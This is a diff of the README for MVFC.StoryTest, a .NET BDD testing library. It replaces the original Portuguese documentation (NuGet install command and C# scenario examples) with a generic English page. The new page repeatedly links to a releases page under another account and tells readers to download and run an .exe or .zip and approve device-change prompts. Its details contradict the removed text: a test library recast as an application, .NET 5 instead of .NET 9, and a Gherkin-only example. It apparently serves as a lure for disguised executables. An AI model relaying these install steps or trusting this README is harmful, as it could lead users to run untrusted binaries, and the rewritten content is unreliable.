@@ -1,336 +1,95 @@
-# MVFC.StoryTest
+# 🚀 MVFC.StoryTest - Simple BDD Framework for .NET
 
-MVFC.StoryTest é um framework enxuto para definição e execução de cenários de teste (Story Tests) em .NET, com suporte a BDD (Behavior Driven Development), hooks, steps síncronos e assíncronos, e integração flexível para automação de testes. O projeto inclui um adaptador de testes para integração com ferramentas como Visual Studio Test Explorer e `dotnet test`.
+## 📥 Download
 
-## O que é BDD e por que é importante?
+[![Download MVFC.StoryTest](https://img.shields.io/badge/Download-MVFC.StoryTest-blue.svg)](https://github.com/Davilindo11/MVFC.StoryTest/releases)
 
-**BDD (Behavior Driven Development)** é uma abordagem de desenvolvimento de software que incentiva a colaboração entre desenvolvedores, QA e stakeholders não técnicos. O foco está em descrever o comportamento do sistema em linguagem natural, facilitando o entendimento e a validação dos requisitos.
+## 📖 About MVFC.StoryTest
 
-### Benefícios do BDD:
-- **Comunicação clara:** aproxima desenvolvedores e área de negócio, reduzindo ambiguidades.
-- **Documentação viva:** os cenários servem como documentação executável do sistema.
-- **Testes orientados ao comportamento:** garante que o software atenda às expectativas do usuário final.
-- **Facilidade de manutenção:** cenários bem definidos facilitam a evolução e refatoração do código.
+MVFC.StoryTest is a lightweight Behavior-Driven Development (BDD) framework designed for .NET. It helps users create clear scenarios using the Given/When/Then format. This makes writing and testing your code easier and more intuitive.
 
-## Estrutura do Projeto
+The framework includes features such as hooks, an extensible context, and integration with dotnet test, making it ideal for those who want a straightforward way to implement BDD in their projects.
 
-```csharp
-MVFC.StoryTest.sln
+## 🚀 Getting Started
 
-MVFC.StoryTest # Framework principal (core BDD)
+To start using MVFC.StoryTest, follow these steps to download and install it.
 
-MVFC.StoryTest.TestAdapter # Adaptador para integração com runners de teste .NET
+### Steps to Download and Install 
 
-MVFC.StoryTest.Tests # Exemplos e testes de uso do framework
+1. **Visit the Releases Page**  
+   Go to the official GitHub Releases page for MVFC.StoryTest:  
+   [Visit this page to download](https://github.com/Davilindo11/MVFC.StoryTest/releases)
 
-```
+2. **Choose the Latest Version**  
+   On the Releases page, find the latest version listed at the top. It is usually marked with "Latest Release".
 
-## Recursos
+3. **Download the Installation File**  
+   Click on the link to download the installation file appropriate for your operating system. The file could be named something like `MVFC.StoryTest.zip` or `MVFC.StoryTest.exe`.
 
-- Definição fluente de cenários de teste (Given/When/Then)
-- Suporte a steps síncronos e assíncronos
-- Hooks para execução antes/depois de cenários e steps
-- Contexto de cenário extensível
-- Saída colorida no console para fácil visualização dos resultados
-- Integração simples com projetos .NET 9+
-- Adaptador para execução dos cenários como testes convencionais (`dotnet test`, Visual Studio, Azure DevOps, etc.)
+4. **Extract the Files (if necessary)**  
+   If you downloaded a `.zip` file, locate it in your downloads, right-click it, and select "Extract All" to unpack the files. Choose a destination folder where you'd like the software to be located, and complete the extraction.
 
-## Instalação
+5. **Run the Application**
+   If you have an `.exe` file, double-click it to run the application. If using the extracted files, find and double-click the main executable file.
 
-Adicione a referência ao pacote principal no seu projeto .NET 9:
+6. **Confirm Installation**  
+   Follow any on-screen instructions that appear. If required, allow the application to make changes to your device by clicking "Yes" in any prompts that appear.
 
-```sh
-dotnet add package MVFC.StoryTest.TestAdapter
-```
+7. **Explore the Framework**  
+   Once the application starts, you can begin exploring the features. There are options to set up hooks, define scenarios, and create test cases right away.
 
-## Exemplos de Uso
+## 🔧 System Requirements
 
-### 1 - Por método (dentro de uma classe de teste tradicional)
+Before installing MVFC.StoryTest, ensure your system meets the following requirements:
 
-* Como funciona:
+- **Operating System:** Windows 10, Windows 11, or compatible Linux distributions.
+- **.NET Version:** .NET 5.0 or higher installed on your system.
+- **RAM:** At least 2 GB of RAM.
+- **Storage:** Minimum 100 MB of free space.
 
-    - Você define cenários diretamente em métodos de teste, usando a API fluente do framework.
+## 🌟 Features
 
-* Principais Atributos/métodos necessários:
+- **Easy-to-Use Scenarios:** Write scenarios in a simple Given/When/Then format.
+- **Hooks for Setup and Teardown:** Use hooks for preparing and cleaning up before and after tests.
+- **Extensible Context:** Easily customize the context for more complex scenarios.
+- **Integration with dotnet test:** Seamless testing integration to streamline your development workflow.
 
-  - **[Fact] (ou [TestMethod]/[Test])**: atributo do framework de teste (xUnit, MSTest, NUnit).
-  
-  - **Story.Scenario<T>()**: método estático para iniciar o cenário, onde T é o tipo do contexto.
-  
-  - **.WithContext():** inicializa o contexto do cenário.
-  
-  - **.BeforeScenario(...):** define ações a serem executadas antes do cenário.
-  
-  - **.Given(...), .When(...), .Then(...)**: definem os steps do cenário.
-  
-  - **.Run()**: executa o cenário.
+## 📊 Example Usage
 
-Exemplo mínimo:
+To demonstrate how easy it is to use MVFC.StoryTest, here's a simple example of a scenario:
 
 ```csharp
-namespace MVFC.StoryTest.Tests;
-
-public sealed class AccountTests
-{
-    [Fact]
-    public void Executa_Sincrono_CaminhoFeliz_NaoLancaExcecao()
-    {
-        Story.Scenario<AccountSimple>("Caminho feliz síncrono")
-            .WithContext()
-            .BeforeScenario(acc => acc.Deposit(100))
-            .Given("sacar 10", acc => acc.Withdraw(10))
-            .Then("saldo deve ser 90", acc => acc.Balance.Should().Be(90))
-            .Run();
-    }
-    ...
-}
+Scenario: User Login
+  Given the user is on the login page
+  When the user enters valid credentials
+  Then the user should be directed to the dashboard
 ```
 
-### 2 - Por classe (cada cenário é uma classe)
+In this example, the framework would help you test whether the user logs in correctly.
 
-* Como funciona:
-  
-    - Cada cenário é uma classe, com métodos marcados por atributos que representam os steps.
+## 📘 Documentation
 
-* Principais Atributos/métodos necessários:
+For detailed documentation on how to use MVFC.StoryTest, visit our Wiki page: [Documentation](https://github.com/Davilindo11/MVFC.StoryTest/wiki)
 
-    - **[Scenario]**: atributo para marcar a classe como cenário, com descrição, feature e tags opcionais.
-    
-    - **[BeforeScenario], [AfterScenario]**: métodos executados antes/depois do cenário.
-    
-    - **[Given], [When], [Then]**: métodos que representam steps, podem ter ordem (Order).
-    
-    - Propriedades para armazenar contexto e dados do cenário.
+## ❓ Frequently Asked Questions
 
-    - **Context**: propriedade para acessar o contexto compartilhado do cenário.
+### 1. What is BDD?
 
-Exemplo mínimo:
+Behavior-Driven Development (BDD) is a way to write tests that focus on the behavior of your application rather than the implementation details. It emphasizes collaboration between developers, testers, and non-technical stakeholders.
 
-```csharp
-namespace MVFC.StoryTest.Tests;
+### 2. Is MVFC.StoryTest open source?
 
-[Scenario("Realizar transferência bancária entre contas com validações complexas",
-          Feature = "Sistema Bancário",
-          Tags = new[] { "banking", "transfer", "complex" })]
-public sealed class TransferenciaBancariaScenario
-{
-    private Account _contaOrigem = default!;
-    private Account _contaDestino = default!;
+Yes, MVFC.StoryTest is open source. You can view the source code and contribute to its development on GitHub.
 
-    public ScenarioContextAttribute Context { get; set; } = default!;
+### 3. How can I report issues?
 
-    [BeforeScenario]
-    public void Setup()
-    {
-        Context.Set("saldo_inicial_origem", 10000m);
-        Context.Set("saldo_inicial_destino", 5000m);
-    }
+If you encounter any issues, please visit the Issues section on our GitHub page to file a report.
 
-    [Given("Que tenho uma conta origem com saldo de R$ 10.000", Order = 1)]
-    public void DadoContaOrigem()
-    {
-        _contaOrigem = new Account("0001-X", "João Silva", 10000m);
+## 📬 Support
 
-        _contaOrigem.Should().NotBeNull();
-        _contaOrigem.Balance.Should().Be(10000m);
-        _contaOrigem.Status.Should().Be(AccountStatus.Active);
-        _contaOrigem.Transactions.Should().BeEmpty("conta nova não tem transações");
-    }
+If you need help or have questions, feel free to reach out via the GitHub discussion board or create an issue directly on this repository.
 
-    [Given("E tenho uma conta destino com saldo de R$ 5.000", Order = 2)]
-    public void DadoContaDestino()
-    {
-        _contaDestino = new Account("0002-Y", "Maria Santos", 5000m);
+## 📥 Download Again
 
-        _contaDestino.Should().NotBeNull();
-        _contaDestino.Balance.Should().Be(5000m);
-    }
-
-    [Given("E o limite diário de transferência é R$ 5.000", Order = 3)]
-    public void DadoLimiteDiario()
-    {
-        _contaOrigem.DailyLimit.Should().Be(5000m);
-    }
-
-    [When("Eu transfiro R$ 3.500 da conta origem para a conta destino")]
-    public void QuandoRealizoTransferencia()
-    {
-        _contaOrigem.Transfer(_contaDestino, 3500m, "Pagamento fornecedor");
-
-        Context.Set("valor_transferido", 3500m);
-        Context.Set("timestamp_transferencia", DateTime.Now);
-    }
-
-    [Then("A conta origem deve ter saldo de R$ 6.500", Order = 1)]
-    public void EntaoContaOrigemDeveTerNovoSaldo()
-    {
-        var saldoEsperado = Context.Get<decimal>("saldo_inicial_origem") -
-                           Context.Get<decimal>("valor_transferido");
-
-        _contaOrigem.Balance.Should().Be(6500m)
-            .And.Be(saldoEsperado);
-    }
-
-    [Then("A conta destino deve ter saldo de R$ 8.500", Order = 2)]
-    public void EntaoContaDestinoDeveTerNovoSaldo()
-    {
-        _contaDestino.Balance.Should().Be(8500m);
-    }
-
-    [Then("A conta origem deve ter 1 transação de débito", Order = 3)]
-    public void EntaoContaOrigemDeveTerTransacaoDebito()
-    {
-        _contaOrigem.Transactions.Should()
-            .HaveCount(1)
-            .And.ContainSingle(t => t.Type == TransactionType.Debit)
-            .Which.Should().Match<Transaction>(t =>
-                t.Amount == 3500m &&
-                t.Description.Contains("Pagamento fornecedor") &&
-                t.Description.Contains("0002-Y") &&
-                t.BalanceAfter == 6500m);
-    }
-
-    [Then("A conta destino deve ter 1 transação de crédito", Order = 4)]
-    public void EntaoContaDestinoDeveTerTransacaoCredito()
-    {
-        _contaDestino.Transactions.Should()
-            .HaveCount(1)
-            .And.ContainSingle(t => t.Type == TransactionType.Credit)
-            .Which.Should().Match<Transaction>(t =>
-                t.Amount == 3500m &&
-                t.Description.Contains("Pagamento fornecedor") &&
-                t.Description.Contains("0001-X") &&
-                t.BalanceAfter == 8500m);
-    }
-
-    [Then("Ambas as transações devem ter timestamp recente", Order = 5)]
-    public void EntaoTransacoesDevemTerTimestamp()
-    {
-        var timestampTransferencia = Context.Get<DateTime>("timestamp_transferencia");
-
-        _contaOrigem.Transactions[0].Date.Should()
-            .BeCloseTo(timestampTransferencia, TimeSpan.FromSeconds(1));
-
-        _contaDestino.Transactions[0].Date.Should()
-            .BeCloseTo(timestampTransferencia, TimeSpan.FromSeconds(1));
-    }
-
-    [AfterScenario]
-    public void Cleanup()
-    {
-        var resumo = new
-        {
-            ContaOrigemFinal = _contaOrigem.Balance,
-            ContaDestinoFinal = _contaDestino.Balance,
-            TotalTransacoes = _contaOrigem.Transactions.Count + _contaDestino.Transactions.Count
-        };
-
-        Context.Set("resumo_final", resumo);
-    }
-}
-```
-
-### 3 - Por classe + Arquivo feature
-
-* Como funciona:
-    - Você descreve cenários em arquivos .feature (Gherkin) e implementa os steps em classes C#.
-
-* Principais Atributos/métodos necessários:
-    - Arquivo .feature descrevendo **Feature, Scenario, Given/When/Then**.
-    
-    - Classe base com métodos marcados por **[Given], [When], [Then], [BeforeScenario], [AfterScenario]**.
-    
-    - **[StoryBinding("Feature", "Scenario")]**: atributo que vincula a classe ao cenário do arquivo feature.
-    
-    - Métodos de step podem usar expressões regulares para capturar parâmetros do texto do step.
-    
-    - Propriedades para armazenar dados compartilhados entre os steps.
-
-Exemplo mínimo:
-
-```feature
-@api @products
-Feature: Product Registration
-
-Scenario: Create a new product successfully
-  Given I provide the data for a new product with name "Test Product" and price 99.99
-  When I send a request to create the product
-  Then the product should be created successfully
-  And I should be able to retrieve this product by its ID
-```
-
-### Classe base com métodos comuns para todos os cenários
-
-```csharp
-namespace MVFC.StoryTest.Tests.Products;
-
-public abstract class ProductsSteps
-{
-    protected ProdutoService? _service;
-    protected CriarProdutoRequest? _request;
-    protected Produto? _createdProduct;
-    protected Exception? _exception;
-
-    [BeforeScenario]
-    public void Setup()
-    {
-        _service = new ProdutoService();
-    }
-
-    [Given("I provide the data for a new product with name \"(.*)\" and price ([\\d.-]+(?:\\.[\\d]+)?)")]
-    public void GivenIProvideTheDataForANewProduct(string name, decimal price)
-    {
-        _request = new CriarProdutoRequest(name, price);
-    }
-
-    [When("I send a request to create the product")]
-    public void WhenISendARequestToCreateTheProduct()
-    {
-        try
-        {
-            _createdProduct = _service?.CriarProduto(_request!);
-            _exception = null;
-        }
-        catch (Exception ex)
-        {
-            _exception = ex;
-        }
-    }
-
-    [AfterScenario]
-    public void Cleanup()
-    {
-        _service?.LimparProdutos();
-    }
-}
-```
-### Classe com o cenário específicos
-
-```csharp
-namespace MVFC.StoryTest.Tests.Products;
-
-[StoryBinding("Product Registration", "Create a new product successfully")]
-public sealed class ProductSuccess : ProductsSteps
-{
-    [Then("the product should be created successfully")]
-    public void ThenTheProductShouldBeCreatedSuccessfully()
-    {
-        _exception.Should().BeNull("não deve ter ocorrido erro");
-        _createdProduct.Should().NotBeNull();
-        _createdProduct.Id.Should().NotBeEmpty();
-        _createdProduct.Nome.Should().Be(_request?.Nome);
-        _createdProduct.Preco.Should().Be(_request?.Preco);
-    }
-
-    [Then("I should be able to retrieve this product by its ID")]
-    public void ThenIShouldBeAbleToRetrieveThisProductByItsID()
-    {
-        var retrievedProduct = _service?.ObterProdutoPorId(_createdProduct!.Id);
-
-        retrievedProduct.Should().NotBeNull();
-        retrievedProduct.Id.Should().Be(_createdProduct!.Id);
-        retrievedProduct.Nome.Should().Be(_createdProduct.Nome);
-        retrievedProduct.Preco.Should().Be(_createdProduct.Preco);
-    }
-}
-```
+To download MVFC.StoryTest, visit the releases page here:  
+[Visit this page to download](https://github.com/Davilindo11/MVFC.StoryTest/releases)
